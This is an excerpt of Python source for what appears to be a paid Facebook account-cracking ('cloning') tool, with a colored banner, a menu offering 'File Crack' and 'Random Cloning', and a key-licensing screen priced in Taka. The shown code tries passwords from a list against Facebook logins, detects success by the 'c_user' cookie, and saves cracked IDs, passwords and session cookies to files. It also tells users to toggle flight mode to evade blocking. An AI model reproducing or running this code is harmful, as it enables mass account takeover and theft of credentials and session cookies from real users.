"""
@ Reverse  By Ethan Edward Kleain
@ Open Source By Owrn
"""
...
#------------[logo]----------#
logo=(f"""\033[1;97m
\x1b[38;5;82md8888b.  .d8b.  d8b   db  d888b  d88888b d8888b. 
\x1b[38;5;83m88  `8D d8' `8b 888o  88 88' Y8b 88'     88  `8D 
\x1b[38;5;84m88   88 88ooo88 88V8o 88 88      88ooooo 88oobY' 
\x1b[38;5;85m88   88 88~~~88 88 V8o88 88  ooo 88~~~~~ 88`8b   
\x1b[38;5;86m88  .8D 88   88 88  V888 88. ~8~ 88.     88 `88. 
\x1b[38;5;87mY8888D' YP   YP VP   V8P  Y888P  Y88888P 88   YD 
{LINEC}
{RED} [{GREEN}={RED}] {GREEN}AUTHOR     {RED}> {GREEN}MIRAJ-KHAN
{RED} [{GREEN1}={RED}] {GREEN1}TOOLS      {RED}> {GREEN1}FILE-CLONING
{RED} [{GREEN2}={RED}] {GREEN2}VERSION    {RED}> {GREEN2} 21.5
{RED} [{GREEN3}={RED}] {GREEN3}WORKING    {RED}> {GREEN3}DATA/WIFI BOTH
{RED} [{GREEN4}={RED}] {GREEN4}STATUS     {RED}> {GREEN3}PAID
{LINEC}""")
def clear():
    os.system("clear")
    print(logo) 
...
def DANGER():   
    os.system('clear')
    print(logo)
    print(f'{RED} [{GREEN}1{RED}] {GREEN} File Crack')
    print(f'{RED} [{GREEN1}2{RED}] {GREEN1} Random Cloning ')
    print(f'{RED} [{GREEN2}3{RED}] {GREEN2} Join Whatsapp Group ')
    print('')
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [DANGER-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/DANGER_OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M3.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(f"{RED} [{GREEN}✔️{RED}] {GREEN}Use flight mode before use {S}")
            print("\033[1;32m-----------------------------------------------------")
            print(f'{RED} [{GREEN1}✔️{RED}] {GREEN1}\033[1;34mCount Ids >> %s ' % len(self.id))
...
def danger_menu():
    ...
    if id in DARK:
        ...
        print ("")
        print("┌━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┐ \n\033[1;32m│ Note : That is Paid because 100% ok id just now login..Free Fire & Pubg Id Cloning Available🔥│\033[1;37m\n└━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━━═━═━═━═━═━═━═━┘")
        print ("") 
        print("    7 Day 250 Taka                          Your Key is Not Approved ")
        print("   15 Day 500 Taka                        Copy And Send Key To Admin")
        print ("")
